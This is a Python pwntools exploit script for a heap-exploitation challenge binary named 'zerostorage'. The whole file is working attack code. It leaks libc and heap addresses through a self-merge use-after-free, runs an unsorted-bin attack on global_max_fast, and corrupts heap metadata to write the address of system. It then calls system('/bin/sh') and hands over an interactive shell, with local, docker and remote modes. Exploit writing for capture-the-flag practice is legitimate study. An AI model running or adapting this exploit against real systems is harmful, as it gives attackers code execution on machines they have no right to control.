from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./zerostorage"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level='debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("choice: ")

def inserte(conn, s):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil(": ")
    conn.sendline(str(len(s)))
    conn.recvuntil(": ")
    conn.send(s)

def updatee(conn, i, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil(": ")
    conn.sendline(str(i))
    conn.recvuntil(": ")
    conn.sendline(str(len(s)))
    conn.recvuntil(": ")
    conn.send(s)

def mergee(conn, f, t):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil(": ")
    conn.sendline(str(f))
    conn.recvuntil(": ")
    conn.sendline(str(t))

def deletee(conn, i):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil(": ")
    conn.sendline(str(i))

def viewe(conn, i):
    recvmenu(conn)
    conn.sendline("5")
    conn.recvuntil(": ")
    conn.sendline(str(i))
    conn.recvline()
    # return conn.recvuntil("\n== Zero")[:-8]

def exploit(conn, elf, libc, local):
    inserte(conn, "A"*0x30) # 0
    inserte(conn, "B"*0xe8) # 1
    inserte(conn, "C"*0x8) # 2
    inserte(conn, "D"*0x8) # 3

    mergee(conn, 0, 0) # 2
    deletee(conn, 2)

    viewe(conn, 4)
    libcleak = u64(conn.recv(8))
    heapleak = u64(conn.recv(8))
    libc.address = libcleak - 0x3be7b8# 0x3c4b78
    heapbase = heapleak - 0x180
    log.info("%#x", libc.address)
    log.info("%#x", heapbase)

    deletee(conn, 3)

    inserte(conn, "A"*0x40 + p64(0xf0)) # 0
    inserte(conn, "A"*0x30 + p64(0xe0)) # 2
    deletee(conn, 0)
    deletee(conn, 2)

    inserte(conn, "A"*2)
    deletee(conn, 0)

    global_max_fast = libc.address + 0x3c0b40 # 0x3c67f8
    unsortedbin = libc.address + 0x3be7b8 # 0x3c4b78

    updatee(conn, 4, p64(unsortedbin) + p64(global_max_fast-0x10))# p64(libc.address + 0x3c4b78) + p64(global_max_fast - 0x10))

    # random stuff
    inserte(conn, p64(heapbase + 0x90 + 0x50) + p64(unsortedbin)) # p64(libc.address + 0x3c4b78)) # 0
    updatee(conn, 1, "A"*8 + p64(heapbase + 0x90 + 0x50) + "A"*0x38 + p64(0xe0) + p64(heapbase + 0x90) + p64(heapbase) + "A"*(0xd0 - 0x38 - 0x18) + p64(0xf0))
    deletee(conn, 1)

    inserte(conn, "A"*0x8)

    # inserte(conn, "A"*0x48 + p64(0x100) + p64(unsortedbin + 0xf0 - 0x20) + p64(unsortedbin + 0xf0 - 0x20))
    inserte(conn, "A"*0x90 + p64(0xf0)) # 2
    inserte(conn, "A"*0x48 + p64(0xffffffffffffff)) # 3

    updatee(conn, 2, "B"*0x38 + p64(0xd0) + p64(0) + "A"*0x50)

    inserte(conn, "C"*0x58 + p64(0xc0) + p64(libc.address + 0x3bfe98 - 0x8) + "C"*(0xc0 - 0x68)) # 0x3c5c58

    inserte(conn, "D"*0xb0)

    updatee(conn, 2, "A"*0x38 + p64(0x20) + p64(unsortedbin) + p64(unsortedbin) + p64(0x20) + "A"*0x40)
    # conn.interactive()
    pause()

    for i in range(16):
        inserte(conn, "\x00"*0xa0)
    # inserte(conn, "\x00"*0x48 + p64(libc.symbols['system'])) # local
    inserte(conn, "\x00"*0x70 + p64(libc.symbols['system'])) # remote

    updatee(conn, 0, "/bin/sh\x00")
    deletee(conn, 0)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("", 1337)
            H,P = ("127.0.0.1", 23232)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
